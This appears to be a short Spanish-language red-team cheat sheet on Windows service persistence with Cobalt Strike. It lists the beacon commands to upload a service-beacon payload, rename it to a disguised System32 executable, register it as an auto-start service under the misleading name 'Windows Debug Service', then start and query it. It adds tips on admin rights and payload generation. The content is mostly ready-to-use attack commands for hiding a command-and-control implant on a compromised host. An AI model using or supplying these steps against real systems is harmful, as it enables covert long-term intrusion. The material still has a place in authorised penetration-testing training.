---
title: Persistencia Avanzada — Windows Service
tags: [persistence, windows-service, cobalt-strike]
---

# Persistencia Avanzada — Windows Service

## Crear servicio

```
beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
```

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `dbgsvc` | nombre interno | Nombre del servicio |
| `"Debug Service"` | display name | Nombre visible |
| `C:\Windows\...` | binPath | Ejecutable |
| `"Windows Debug Service"` | description | Descripción |
| `0` | error control | 0=ignore errors |
| `2` | start type | 2=auto, 3=demand |
| `3` | service type | 3=interactive |

## Subir el payload primero

```
beacon> upload C:\Payloads\service-beacon.exe
beacon> mv service-beacon.exe C:\Windows\System32\debug_svc.exe
```

## Iniciar el servicio

```
beacon> run sc start dbgsvc
```

## Verificar

```
beacon> run sc query dbgsvc
```

> [!important] Los servicios requieren privilegios de administrador para crearse. El binario debe ser un **Windows Service EXE** (acepta el control de servicio SCM).

> [!tip] Usar `Attacks → Packages → Windows Service EXE` en Cobalt Strike para generar el payload correcto.
